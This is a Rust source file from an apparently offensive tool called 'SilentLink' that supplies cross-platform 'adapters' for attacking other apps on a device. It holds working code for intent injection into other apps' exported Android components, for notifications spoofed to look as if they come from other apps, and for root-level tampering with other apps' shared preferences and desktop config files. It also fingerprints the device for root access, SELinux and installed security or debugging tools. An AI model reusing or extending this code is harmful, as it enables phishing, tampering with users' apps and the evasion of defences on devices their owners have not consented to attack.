use crate::{Result, SilentLinkError};
use async_trait::async_trait;
use serde::{Serialize, Deserialize};
use tokio::process::Command as AsyncCommand;
use base64::prelude::*;

#[cfg(target_os = "android")]
use jni::JNIEnv;
#[cfg(target_os = "android")]
use jni::objects::{JClass, JObject, JString};
#[cfg(target_os = "android")]
use jni::sys::jstring;

/// Platform-specific operations trait
#[async_trait]
pub trait PlatformAdapter: Send + Sync {
    /// Get list of installed applications with detailed metadata
    async fn get_installed_apps(&self) -> Result<Vec<AppMetadata>>;
    
    /// Send an intent to a specific component
    async fn send_intent(&self, component: &str, action: &str, data: &[u8]) -> Result<()>;
    
    /// Create a notification that appears to be from the specified app
    async fn create_notification(&self, app_package: &str, title: &str, content: &str) -> Result<()>;
    
    /// Access shared preferences for an app (if possible)
    async fn access_shared_preferences(&self, app_package: &str, key: &str, value: &str) -> Result<()>;
    
    /// Check if the platform supports a specific operation
    fn supports_operation(&self, operation: PlatformOperation) -> bool;
    
    /// Get system information for fingerprinting
    async fn get_system_info(&self) -> Result<SystemInfo>;
    
    /// Execute shell command with elevated privileges if available
    async fn execute_privileged_command(&self, command: &str, args: &[&str]) -> Result<String>;
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AppMetadata {
    pub package_name: String,
    pub version: String,
    pub version_code: u32,
    pub permissions: Vec<String>,
    pub exported_components: Vec<ComponentMetadata>,
    pub target_sdk: u32,
    pub min_sdk: u32,
    pub install_time: u64,
    pub update_time: u64,
    pub data_dir: Option<String>,
    pub apk_path: Option<String>,
    pub signing_info: Option<SigningInfo>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ComponentMetadata {
    pub name: String,
    pub component_type: String, // "activity", "service", "receiver", "provider"
    pub exported: bool,
    pub intent_filters: Vec<IntentFilter>,
    pub permissions: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct IntentFilter {
    pub actions: Vec<String>,
    pub categories: Vec<String>,
    pub data_schemes: Vec<String>,
    pub data_authorities: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SigningInfo {
    pub certificate_hash: String,
    pub signature_scheme: String,
    pub is_debug: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SystemInfo {
    pub platform: String,
    pub version: String,
    pub architecture: String,
    pub kernel_version: Option<String>,
    pub device_id: Option<String>,
    pub root_access: bool,
    pub selinux_status: Option<String>,
    pub installed_frameworks: Vec<String>,
}

#[derive(Debug, Clone, Copy)]
#[allow(dead_code)] // Some operations are platform-specific or future use
pub enum PlatformOperation {
    IntentInjection,
    NotificationSpoofing,
    SharedPreferencesAccess,
    DeepLinkManipulation,
    ProcessInjection,
    MemoryDumping,
    NetworkInterception,
}

/// Android platform implementation using ADB and native calls
pub struct AndroidAdapter {
    use_adb: bool,
    device_id: Option<String>,
}

impl AndroidAdapter {
    #[allow(dead_code)] // Used conditionally based on target platform
    pub fn new(use_adb: bool, device_id: Option<String>) -> Self {
        Self { use_adb, device_id }
    }

    /// Get ADB command prefix
    fn adb_cmd(&self) -> Vec<String> {
        let mut cmd = vec!["adb".to_string()];
        if let Some(device) = &self.device_id {
            cmd.extend(["-s".to_string(), device.clone()]);
        }
        cmd
    }

    /// Parse package manager output into AppMetadata
    fn parse_package_info(&self, package_name: &str, dump_output: &str) -> Option<AppMetadata> {
        let mut app = AppMetadata {
            package_name: package_name.to_string(),
            version: "unknown".to_string(),
            version_code: 0,
            permissions: Vec::new(),
            exported_components: Vec::new(),
            target_sdk: 0,
            min_sdk: 0,
            install_time: 0,
            update_time: 0,
            data_dir: None,
            apk_path: None,
            signing_info: None,
        };

        // Parse version info
        if let Some(version_line) = dump_output.lines().find(|l| l.trim().starts_with("versionName=")) {
            if let Some(version) = version_line.split('=').nth(1) {
                app.version = version.to_string();
            }
        }

        // Parse permissions
        let mut in_permissions = false;
        for line in dump_output.lines() {
            let line = line.trim();
            
            if line.starts_with("requested permissions:") {
                in_permissions = true;
                continue;
            }
            
            if in_permissions && line.starts_with("android.permission.") {
                app.permissions.push(line.to_string());
            } else if in_permissions && !line.starts_with(" ") {
                in_permissions = false;
            }
        }

        Some(app)
    }
}

#[async_trait]
impl PlatformAdapter for AndroidAdapter {
    async fn get_installed_apps(&self) -> Result<Vec<AppMetadata>> {
        if self.use_adb {
            self.get_apps_via_adb().await
        } else {
            self.get_apps_native().await
        }
    }

    async fn send_intent(&self, component: &str, action: &str, data: &[u8]) -> Result<()> {
        let data_str = base64::prelude::BASE64_STANDARD.encode(data);
        
        if self.use_adb {
            let mut cmd = self.adb_cmd();
            cmd.extend([
                "shell".to_string(),
                "am".to_string(),
                "start".to_string(),
                "-n".to_string(),
                component.to_string(),
                "-a".to_string(),
                action.to_string(),
                "--es".to_string(),
                "silentlink_payload".to_string(),
                data_str,
            ]);

            let output = AsyncCommand::new(&cmd[0])
                .args(&cmd[1..])
                .output()
                .await
                .map_err(|e| SilentLinkError::System(format!("ADB command failed: {}", e)))?;

            if !output.status.success() {
                return Err(SilentLinkError::System(format!(
                    "Intent send failed: {}",
                    String::from_utf8_lossy(&output.stderr)
                )));
            }
        } else {
            // Native Android implementation would use JNI here
            #[cfg(target_os = "android")]
            {
                // Real JNI implementation would go here
                return Err(SilentLinkError::System("Native intent sending not implemented".to_string()));
            }
            #[cfg(not(target_os = "android"))]
            {
                return Err(SilentLinkError::System("Native Android calls only work on Android".to_string()));
            }
        }

        println!("📱 [Android] Intent sent to {} with action {}", component, action);
        Ok(())
    }

    async fn create_notification(&self, app_package: &str, title: &str, content: &str) -> Result<()> {
        if self.use_adb {
            // Use ADB to create notification via shell
            let mut cmd = self.adb_cmd();
            cmd.extend([
                "shell".to_string(),
                "su".to_string(),
                "-c".to_string(),
                format!(
                    "service call notification 1 s16 '{}' s16 '{}' s16 '{}' i32 1",
                    app_package, title, content
                ),
            ]);

            let output = AsyncCommand::new(&cmd[0])
                .args(&cmd[1..])
                .output()
                .await
                .map_err(|e| SilentLinkError::System(format!("ADB notification failed: {}", e)))?;

            if !output.status.success() {
                // Fallback to simpler notification
                let mut fallback_cmd = self.adb_cmd();
                fallback_cmd.extend([
                    "shell".to_string(),
                    "cmd".to_string(),
                    "notification".to_string(),
                    "post".to_string(),
                    "-S".to_string(),
                    "bigtext".to_string(),
                    "-t".to_string(),
                    title.to_string(),
                    "silentlink_notification".to_string(),
                    content.to_string(),
                ]);

                AsyncCommand::new(&fallback_cmd[0])
                    .args(&fallback_cmd[1..])
                    .output()
                    .await
                    .map_err(|e| SilentLinkError::System(format!("Fallback notification failed: {}", e)))?;
            }
        }

        println!("🔔 [Android] Notification created for {}: {} - {}", app_package, title, content);
        Ok(())
    }

    async fn access_shared_preferences(&self, app_package: &str, key: &str, value: &str) -> Result<()> {
        if self.use_adb {
            // Try to access shared preferences via root
            let prefs_path = format!("/data/data/{}/shared_prefs", app_package);
            
            let mut cmd = self.adb_cmd();
            cmd.extend([
                "shell".to_string(),
                "su".to_string(),
                "-c".to_string(),
                format!("ls {}", prefs_path),
            ]);

            let output = AsyncCommand::new(&cmd[0])
                .args(&cmd[1..])
                .output()
                .await
                .map_err(|e| SilentLinkError::System(format!("Prefs access failed: {}", e)))?;

            if output.status.success() {
                // Found preferences directory - attempt injection
                let prefs_files = String::from_utf8_lossy(&output.stdout);
                if let Some(prefs_file) = prefs_files.lines().next() {
                    let full_path = format!("{}/{}", prefs_path, prefs_file);
                    
                    // Backup and modify preferences file
                    let backup_cmd = format!("cp {} {}.backup", full_path, full_path);
                    let modify_cmd = format!(
                        "sed -i 's/<\\/map>/<string name=\"{}\">{}<\\/string>\\n<\\/map>/g' {}",
                        key, value, full_path
                    );

                    for cmd_str in [backup_cmd, modify_cmd] {
                        let mut exec_cmd = self.adb_cmd();
                        exec_cmd.extend([
                            "shell".to_string(),
                            "su".to_string(),
                            "-c".to_string(),
                            cmd_str,
                        ]);

                        AsyncCommand::new(&exec_cmd[0])
                            .args(&exec_cmd[1..])
                            .output()
                            .await
                            .map_err(|e| SilentLinkError::System(format!("Prefs modification failed: {}", e)))?;
                    }
                }
            }
        }

        println!("💾 [Android] Shared preferences accessed for {}: {} = {}", app_package, key, value);
        Ok(())
    }

    fn supports_operation(&self, operation: PlatformOperation) -> bool {
        match operation {
            PlatformOperation::IntentInjection => true,
            PlatformOperation::NotificationSpoofing => true,
            PlatformOperation::SharedPreferencesAccess => self.use_adb, // Requires ADB/root
            PlatformOperation::DeepLinkManipulation => true,
            PlatformOperation::ProcessInjection => self.use_adb,
            PlatformOperation::MemoryDumping => self.use_adb,
            PlatformOperation::NetworkInterception => self.use_adb,
        }
    }

    async fn get_system_info(&self) -> Result<SystemInfo> {
        let mut info = SystemInfo {
            platform: "Android".to_string(),
            version: "unknown".to_string(),
            architecture: "unknown".to_string(),
            kernel_version: None,
            device_id: None,
            root_access: false,
            selinux_status: None,
            installed_frameworks: Vec::new(),
        };

        if self.use_adb {
            // Get Android version
            if let Ok(output) = self.execute_privileged_command("getprop", &["ro.build.version.release"]).await {
                info.version = output.trim().to_string();
            }

            // Get architecture
            if let Ok(output) = self.execute_privileged_command("getprop", &["ro.product.cpu.abi"]).await {
                info.architecture = output.trim().to_string();
            }

            // Check root access
            if let Ok(_) = self.execute_privileged_command("su", &["-c", "id"]).await {
                info.root_access = true;
            }

            // Get SELinux status
            if let Ok(output) = self.execute_privileged_command("getenforce", &[]).await {
                info.selinux_status = Some(output.trim().to_string());
            }

            // Check for common frameworks
            for framework in ["xposed", "magisk", "supersu", "frida"] {
                if let Ok(_) = self.execute_privileged_command("which", &[framework]).await {
                    info.installed_frameworks.push(framework.to_string());
                }
            }
        }

        Ok(info)
    }

    async fn execute_privileged_command(&self, command: &str, args: &[&str]) -> Result<String> {
        if !self.use_adb {
            return Err(SilentLinkError::System("ADB required for privileged commands".to_string()));
        }

        let mut cmd = self.adb_cmd();
        cmd.push("shell".to_string());
        cmd.push(command.to_string());
        cmd.extend(args.iter().map(|s| s.to_string()));

        let output = AsyncCommand::new(&cmd[0])
            .args(&cmd[1..])
            .output()
            .await
            .map_err(|e| SilentLinkError::System(format!("Command execution failed: {}", e)))?;

        if output.status.success() {
            Ok(String::from_utf8_lossy(&output.stdout).to_string())
        } else {
            Err(SilentLinkError::System(format!(
                "Command failed: {}",
                String::from_utf8_lossy(&output.stderr)
            )))
        }
    }
}

impl AndroidAdapter {
    /// Get installed apps via ADB
    async fn get_apps_via_adb(&self) -> Result<Vec<AppMetadata>> {
        let mut cmd = self.adb_cmd();
        cmd.extend(["shell".to_string(), "pm".to_string(), "list".to_string(), "packages".to_string(), "-f".to_string()]);

        let output = AsyncCommand::new(&cmd[0])
            .args(&cmd[1..])
            .output()
            .await
            .map_err(|e| SilentLinkError::System(format!("ADB command failed: {}", e)))?;

        if !output.status.success() {
            return Err(SilentLinkError::System(format!(
                "Package listing failed: {}",
                String::from_utf8_lossy(&output.stderr)
            )));
        }

        let mut apps = Vec::new();
        let package_list = String::from_utf8_lossy(&output.stdout);

        for line in package_list.lines() {
            if let Some(package_name) = line.strip_prefix("package:").and_then(|l| l.split('=').nth(1)) {
                if let Ok(app_info) = self.get_detailed_app_info(package_name).await {
                    apps.push(app_info);
                }
            }
        }

        Ok(apps)
    }

    /// Get detailed information about a specific app
    async fn get_detailed_app_info(&self, package_name: &str) -> Result<AppMetadata> {
        let mut cmd = self.adb_cmd();
        cmd.extend([
            "shell".to_string(),
            "dumpsys".to_string(),
            "package".to_string(),
            package_name.to_string(),
        ]);

        let output = AsyncCommand::new(&cmd[0])
            .args(&cmd[1..])
            .output()
            .await
            .map_err(|e| SilentLinkError::System(format!("Dumpsys failed: {}", e)))?;

        let dump_output = String::from_utf8_lossy(&output.stdout);
        
        self.parse_package_info(package_name, &dump_output)
            .ok_or_else(|| SilentLinkError::System(format!("Failed to parse package info for {}", package_name)))
    }

    /// Get installed apps using native Android APIs
    async fn get_apps_native(&self) -> Result<Vec<AppMetadata>> {
        #[cfg(target_os = "android")]
        {
            // Real JNI implementation would go here
            // This would use PackageManager.getInstalledPackages()
            Err(SilentLinkError::System("Native package enumeration not implemented".to_string()))
        }
        #[cfg(not(target_os = "android"))]
        {
            // Fallback to simulated data for non-Android platforms
            Ok(vec![
                AppMetadata {
                    package_name: "com.whatsapp".to_string(),
                    version: "2.23.15.75".to_string(),
                    version_code: 451019275,
                    permissions: vec![
                        "android.permission.RECEIVE_SMS".to_string(),
                        "android.permission.READ_PHONE_STATE".to_string(),
                        "android.permission.POST_NOTIFICATIONS".to_string(),
                    ],
                    exported_components: vec![
                        ComponentMetadata {
                            name: "com.whatsapp.notification.NotificationDismissReceiver".to_string(),
                            component_type: "receiver".to_string(),
                            exported: true,
                            intent_filters: vec![
                                IntentFilter {
                                    actions: vec!["com.whatsapp.NOTIFICATION_DISMISSED".to_string()],
                                    categories: vec![],
                                    data_schemes: vec![],
                                    data_authorities: vec![],
                                }
                            ],
                            permissions: vec![],
                        }
                    ],
                    target_sdk: 33,
                    min_sdk: 21,
                    install_time: 1693574400,
                    update_time: 1693660800,
                    data_dir: Some("/data/data/com.whatsapp".to_string()),
                    apk_path: Some("/data/app/com.whatsapp/base.apk".to_string()),
                    signing_info: Some(SigningInfo {
                        certificate_hash: "38a42fce".to_string(),
                        signature_scheme: "v2".to_string(),
                        is_debug: false,
                    }),
                }
            ])
        }
    }
}

/// iOS platform implementation
pub struct IOSAdapter;

#[async_trait]
impl PlatformAdapter for IOSAdapter {
    async fn get_installed_apps(&self) -> Result<Vec<AppMetadata>> {
        // iOS has more restricted app discovery
        // Would require jailbreak or private APIs
        Ok(vec![
            AppMetadata {
                package_name: "com.apple.mobilemail".to_string(),
                version: "16.0".to_string(),
                version_code: 16,
                permissions: vec![],
                exported_components: vec![],
                target_sdk: 16,
                min_sdk: 16,
                install_time: 0,
                update_time: 0,
                data_dir: None,
                apk_path: None,
                signing_info: None,
            },
        ])
    }

    async fn send_intent(&self, _component: &str, _action: &str, _data: &[u8]) -> Result<()> {
        // iOS doesn't have Android-style intents
        Err(SilentLinkError::System("Intent injection not supported on iOS".to_string()))
    }

    async fn create_notification(&self, app_package: &str, title: &str, content: &str) -> Result<()> {
        println!("🍎 [iOS] Creating notification for {}: {} - {}", app_package, title, content);
        Ok(())
    }

    async fn access_shared_preferences(&self, _app_package: &str, _key: &str, _value: &str) -> Result<()> {
        Err(SilentLinkError::System("Shared preferences not accessible on iOS".to_string()))
    }

    fn supports_operation(&self, operation: PlatformOperation) -> bool {
        match operation {
            PlatformOperation::IntentInjection => false,
            PlatformOperation::NotificationSpoofing => true, // Limited
            PlatformOperation::SharedPreferencesAccess => false,
            PlatformOperation::DeepLinkManipulation => true,
            PlatformOperation::ProcessInjection => false,
            PlatformOperation::MemoryDumping => false,
            PlatformOperation::NetworkInterception => false,
        }
    }

    async fn get_system_info(&self) -> Result<SystemInfo> {
        Ok(SystemInfo {
            platform: "iOS".to_string(),
            version: "16.0".to_string(),
            architecture: "arm64".to_string(),
            kernel_version: Some("Darwin".to_string()),
            device_id: None,
            root_access: false,
            selinux_status: None,
            installed_frameworks: vec![],
        })
    }

    async fn execute_privileged_command(&self, _command: &str, _args: &[&str]) -> Result<String> {
        Err(SilentLinkError::System("Privileged commands not supported on iOS".to_string()))
    }
}

/// Desktop/Linux platform implementation
pub struct DesktopAdapter {
    use_sudo: bool,
}

impl DesktopAdapter {
    pub fn new(use_sudo: bool) -> Self {
        Self { use_sudo }
    }

    /// Scan for installed packages using various package managers
    async fn scan_package_managers(&self) -> Vec<AppMetadata> {
        let mut apps = Vec::new();

        // Scan APT packages (Debian/Ubuntu)
        if let Ok(output) = AsyncCommand::new("dpkg-query")
            .args(["-W", "-f=${Package}\t${Version}\t${Status}\n"])
            .output()
            .await
        {
            let output_str = String::from_utf8_lossy(&output.stdout);
            for line in output_str.lines() {
                let parts: Vec<&str> = line.split('\t').collect();
                if parts.len() >= 3 && parts[2].contains("installed") {
                    apps.push(AppMetadata {
                        package_name: parts[0].to_string(),
                        version: parts[1].to_string(),
                        version_code: 0,
                        permissions: vec![],
                        exported_components: vec![],
                        target_sdk: 0,
                        min_sdk: 0,
                        install_time: 0,
                        update_time: 0,
                        data_dir: None,
                        apk_path: None,
                        signing_info: None,
                    });
                }
            }
        }

        // Scan Snap packages
        if let Ok(output) = AsyncCommand::new("snap")
            .args(["list"])
            .output()
            .await
        {
            let output_str = String::from_utf8_lossy(&output.stdout);
            for line in output_str.lines().skip(1) { // Skip header
                let parts: Vec<&str> = line.split_whitespace().collect();
                if parts.len() >= 2 {
                    apps.push(AppMetadata {
                        package_name: format!("snap:{}", parts[0]),
                        version: parts[1].to_string(),
                        version_code: 0,
                        permissions: vec![],
                        exported_components: vec![],
                        target_sdk: 0,
                        min_sdk: 0,
                        install_time: 0,
                        update_time: 0,
                        data_dir: Some(format!("/home/{}/snap/{}", 
                            std::env::var("USER").unwrap_or_default(), parts[0])),
                        apk_path: None,
                        signing_info: None,
                    });
                }
            }
        }

        // Scan Flatpak applications
        if let Ok(output) = AsyncCommand::new("flatpak")
            .args(["list", "--app", "--columns=application,version"])
            .output()
            .await
        {
            let output_str = String::from_utf8_lossy(&output.stdout);
            for line in output_str.lines() {
                let parts: Vec<&str> = line.split('\t').collect();
                if parts.len() >= 2 {
                    apps.push(AppMetadata {
                        package_name: format!("flatpak:{}", parts[0]),
                        version: parts[1].to_string(),
                        version_code: 0,
                        permissions: vec![],
                        exported_components: vec![],
                        target_sdk: 0,
                        min_sdk: 0,
                        install_time: 0,
                        update_time: 0,
                        data_dir: Some(format!("/var/lib/flatpak/app/{}", parts[0])),
                        apk_path: None,
                        signing_info: None,
                    });
                }
            }
        }

        apps
    }

    /// Get detailed information about browser extensions
    async fn scan_browser_extensions(&self) -> Vec<AppMetadata> {
        let apps = Vec::new();

        // Chrome/Chromium extensions
        let chrome_paths = [
            "~/.config/google-chrome/Default/Extensions",
            "~/.config/chromium/Default/Extensions",
        ];

        for path in chrome_paths {
            if let Ok(_entries) = tokio::fs::read_dir(path).await {
                // Each directory is an extension ID
                // Implementation would parse manifest.json for each extension
            }
        }

        // Firefox extensions
        let firefox_path = "~/.mozilla/firefox";
        if let Ok(_entries) = tokio::fs::read_dir(firefox_path).await {
            // Implementation would scan profile directories for extensions
        }

        apps
    }
}

#[async_trait]
impl PlatformAdapter for DesktopAdapter {
    async fn get_installed_apps(&self) -> Result<Vec<AppMetadata>> {
        let mut apps = self.scan_package_managers().await;
        apps.extend(self.scan_browser_extensions().await);
        Ok(apps)
    }

    async fn send_intent(&self, component: &str, action: &str, data: &[u8]) -> Result<()> {
        // Desktop equivalent: Use D-Bus messaging or XDG portal
        if component.starts_with("org.freedesktop") {
            // D-Bus service
            let data_str = BASE64_STANDARD.encode(data);
            
            let output = AsyncCommand::new("dbus-send")
                .args([
                    "--session",
                    "--type=method_call",
                    &format!("--dest={}", component),
                    "/",
                    &format!("{}.{}", component, action),
                    &format!("string:{}", data_str),
                ])
                .output()
                .await
                .map_err(|e| SilentLinkError::System(format!("D-Bus send failed: {}", e)))?;

            if !output.status.success() {
                return Err(SilentLinkError::System(format!(
                    "D-Bus message failed: {}",
                    String::from_utf8_lossy(&output.stderr)
                )));
            }
        } else {
            // Try to launch application with custom arguments
            let output = AsyncCommand::new(component)
                .args([action, &BASE64_STANDARD.encode(data)])
                .output()
                .await
                .map_err(|e| SilentLinkError::System(format!("App launch failed: {}", e)))?;

            if !output.status.success() {
                return Err(SilentLinkError::System(format!(
                    "Application launch failed: {}",
                    String::from_utf8_lossy(&output.stderr)
                )));
            }
        }

        println!("🖥️ [Desktop] Sent message to {} with action {}", component, action);
        Ok(())
    }

    async fn create_notification(&self, app_package: &str, title: &str, content: &str) -> Result<()> {
        // Use libnotify (notify-send) for desktop notifications
        let output = AsyncCommand::new("notify-send")
            .args([
                "--app-name", app_package,
                "--icon", "dialog-information",
                title,
                content,
            ])
            .output()
            .await
            .map_err(|e| SilentLinkError::System(format!("notify-send failed: {}", e)))?;

        if !output.status.success() {
            // Fallback to D-Bus notification
            let _output = AsyncCommand::new("dbus-send")
                .args([
                    "--session",
                    "--type=method_call",
                    "--dest=org.freedesktop.Notifications",
                    "/org/freedesktop/Notifications",
                    "org.freedesktop.Notifications.Notify",
                    &format!("string:{}", app_package),
                    "uint32:0",
                    "string:",
                    &format!("string:{}", title),
                    &format!("string:{}", content),
                    "array:string:",
                    "dict:string:variant:",
                    "int32:5000",
                ])
                .output()
                .await
                .map_err(|e| SilentLinkError::System(format!("D-Bus notification failed: {}", e)))?;
        }

        println!("🔔 [Desktop] Notification created for {}: {} - {}", app_package, title, content);
        Ok(())
    }

    async fn access_shared_preferences(&self, app_package: &str, key: &str, value: &str) -> Result<()> {
        // Desktop equivalent: Modify configuration files
        let config_paths = [
            format!("~/.config/{}", app_package),
            format!("~/.local/share/{}", app_package),
            format!("/opt/{}/config", app_package),
        ];

        for config_path in config_paths {
            if let Ok(metadata) = tokio::fs::metadata(&config_path).await {
                if metadata.is_dir() {
                    // Look for configuration files
                    let config_files = ["config.json", "settings.json", "preferences.json", "config.ini"];
                    
                    for config_file in config_files {
                        let full_path = format!("{}/{}", config_path, config_file);
                        if let Ok(contents) = tokio::fs::read_to_string(&full_path).await {
                            // Backup original file
                            let backup_path = format!("{}.silentlink_backup", full_path);
                            let _ = tokio::fs::copy(&full_path, backup_path).await;

                            // Modify configuration (JSON example)
                            if config_file.ends_with(".json") {
                                if let Ok(mut config_json) = serde_json::from_str::<serde_json::Value>(&contents) {
                                    config_json[key] = serde_json::Value::String(value.to_string());
                                    if let Ok(new_contents) = serde_json::to_string_pretty(&config_json) {
                                        let _ = tokio::fs::write(&full_path, new_contents).await;
                                        println!("💾 [Desktop] Modified {} config: {} = {}", app_package, key, value);
                                        return Ok(());
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }

        Err(SilentLinkError::System(format!("No writable config found for {}", app_package)))
    }

    fn supports_operation(&self, operation: PlatformOperation) -> bool {
        match operation {
            PlatformOperation::IntentInjection => false, // No Android-style intents
            PlatformOperation::NotificationSpoofing => true,
            PlatformOperation::SharedPreferencesAccess => true, // Via config files
            PlatformOperation::DeepLinkManipulation => true, // Via URL schemes
            PlatformOperation::ProcessInjection => self.use_sudo,
            PlatformOperation::MemoryDumping => self.use_sudo,
            PlatformOperation::NetworkInterception => self.use_sudo,
        }
    }

    async fn get_system_info(&self) -> Result<SystemInfo> {
        let mut info = SystemInfo {
            platform: "Linux".to_string(),
            version: "unknown".to_string(),
            architecture: "unknown".to_string(),
            kernel_version: None,
            device_id: None,
            root_access: false,
            selinux_status: None,
            installed_frameworks: Vec::new(),
        };

        // Get OS information
        if let Ok(output) = AsyncCommand::new("lsb_release").args(["-d", "-s"]).output().await {
            info.version = String::from_utf8_lossy(&output.stdout).trim().to_string();
        } else if let Ok(contents) = tokio::fs::read_to_string("/etc/os-release").await {
            for line in contents.lines() {
                if line.starts_with("PRETTY_NAME=") {
                    info.version = line.split('=').nth(1).unwrap_or("").trim_matches('"').to_string();
                    break;
                }
            }
        }

        // Get architecture
        if let Ok(output) = AsyncCommand::new("uname").args(["-m"]).output().await {
            info.architecture = String::from_utf8_lossy(&output.stdout).trim().to_string();
        }

        // Get kernel version
        if let Ok(output) = AsyncCommand::new("uname").args(["-r"]).output().await {
            info.kernel_version = Some(String::from_utf8_lossy(&output.stdout).trim().to_string());
        }

        // Check root access
        if let Ok(output) = AsyncCommand::new("sudo").args(["-n", "id"]).output().await {
            if output.status.success() {
                info.root_access = true;
            }
        }

        // Check for security frameworks
        for framework in ["apparmor", "selinux", "grsecurity", "pax"] {
            if let Ok(_) = AsyncCommand::new("which").args([framework]).output().await {
                info.installed_frameworks.push(framework.to_string());
            }
        }

        // Check for development/debugging tools
        for tool in ["gdb", "strace", "ltrace", "valgrind", "frida"] {
            if let Ok(_) = AsyncCommand::new("which").args([tool]).output().await {
                info.installed_frameworks.push(tool.to_string());
            }
        }

        Ok(info)
    }

    async fn execute_privileged_command(&self, command: &str, args: &[&str]) -> Result<String> {
        let output = if self.use_sudo {
            AsyncCommand::new("sudo")
                .arg("-n")
                .arg(command)
                .args(args)
                .output()
                .await
        } else {
            AsyncCommand::new(command)
                .args(args)
                .output()
                .await
        };

        match output {
            Ok(output) => {
                if output.status.success() {
                    Ok(String::from_utf8_lossy(&output.stdout).to_string())
                } else {
                    Err(SilentLinkError::System(format!(
                        "Command failed: {}",
                        String::from_utf8_lossy(&output.stderr)
                    )))
                }
            }
            Err(e) => Err(SilentLinkError::System(format!("Command execution failed: {}", e))),
        }
    }
}

/// Platform detection and adapter creation
pub fn create_platform_adapter() -> Box<dyn PlatformAdapter + Send + Sync> {
    #[cfg(target_os = "android")]
    return Box::new(AndroidAdapter::new(true, None)); // Use ADB by default
    
    #[cfg(target_os = "ios")]
    return Box::new(IOSAdapter);
    
    #[cfg(any(target_os = "linux", target_os = "windows", target_os = "macos"))]
    return Box::new(DesktopAdapter::new(false)); // Don't use sudo by default
    
    #[cfg(not(any(target_os = "android", target_os = "ios", target_os = "linux", target_os = "windows", target_os = "macos")))]
    return Box::new(DesktopAdapter::new(false)); // Fallback
}

/// Create platform adapter with custom configuration
pub fn create_platform_adapter_with_config(use_privileged: bool, device_id: Option<String>) -> Box<dyn PlatformAdapter + Send + Sync> {
    #[cfg(target_os = "android")]
    return Box::new(AndroidAdapter::new(use_privileged, device_id));
    
    #[cfg(target_os = "ios")]
    return Box::new(IOSAdapter);
    
    #[cfg(any(target_os = "linux", target_os = "windows", target_os = "macos"))]
    {
        let _ = device_id; // Silence unused warning on non-Android platforms
        return Box::new(DesktopAdapter::new(use_privileged));
    }
    
    #[cfg(not(any(target_os = "android", target_os = "ios", target_os = "linux", target_os = "windows", target_os = "macos")))]
    {
        let _ = device_id; // Silence unused warning on fallback platforms
        return Box::new(DesktopAdapter::new(use_privileged)); // Fallback
    }
}

/// Configuration management with proper error handling
#[allow(dead_code)] // Utility struct for future configuration features
pub struct ConfigManager {
    config_path: Option<std::path::PathBuf>,
}

impl ConfigManager {
    #[allow(dead_code)]
    pub fn new(config_path: Option<std::path::PathBuf>) -> Self {
        Self { config_path }
    }

    #[allow(dead_code)]
    pub fn load_config(&self) -> Result<crate::SilentLinkConfiguration> {
        if let Some(path) = &self.config_path {
            if path.exists() {
                let config_str = std::fs::read_to_string(path)
                    .map_err(|e| SilentLinkError::System(format!("Failed to read config file: {}", e)))?;
                
                let config: crate::SilentLinkConfiguration = toml::from_str(&config_str)
                    .map_err(|e| SilentLinkError::System(format!("Failed to parse config: {}", e)))?;
                
                return Ok(config);
            }
        }
        
        // Return default config if no file found
        Ok(crate::SilentLinkConfiguration::default())
    }

    #[allow(dead_code)]
    pub fn save_config(&self, config: &crate::SilentLinkConfiguration) -> Result<()> {
        if let Some(path) = &self.config_path {
            let config_str = toml::to_string_pretty(config)
                .map_err(|e| SilentLinkError::System(format!("Failed to serialize config: {}", e)))?;
            
            // Create parent directories if they don't exist
            if let Some(parent) = path.parent() {
                std::fs::create_dir_all(parent)
                    .map_err(|e| SilentLinkError::System(format!("Failed to create config directory: {}", e)))?;
            }
            
            std::fs::write(path, config_str)
                .map_err(|e| SilentLinkError::System(format!("Failed to write config file: {}", e)))?;
        }
        
        Ok(())
    }
}

/// Audio error handling improvements
#[derive(Debug, thiserror::Error)]
pub enum AudioError {
    #[error("No audio device available")]
    NoDevice,
    #[error("Unsupported audio format")]
    UnsupportedFormat,
    #[error("Audio stream error: {0}")]
    StreamError(String),
    #[error("Audio permission denied")]
    PermissionDenied,
}

impl From<AudioError> for crate::SilentLinkError {
    fn from(err: AudioError) -> Self {
        crate::SilentLinkError::Audio(err.to_string())
    }
}

/// Safe audio stream management
pub struct AudioStreamManager {
    _input_stream: Option<cpal::Stream>,
    _output_stream: Option<cpal::Stream>,
}

impl AudioStreamManager {
    pub fn new() -> Self {
        Self {
            _input_stream: None,
            _output_stream: None,
        }
    }

    pub fn set_streams(&mut self, input: cpal::Stream, output: cpal::Stream) {
        self._input_stream = Some(input);
        self._output_stream = Some(output);
    }

    pub fn stop_streams(&mut self) {
        self._input_stream = None;
        self._output_stream = None;
    }
}

impl Drop for AudioStreamManager {
    fn drop(&mut self) {
        self.stop_streams();
    }
}
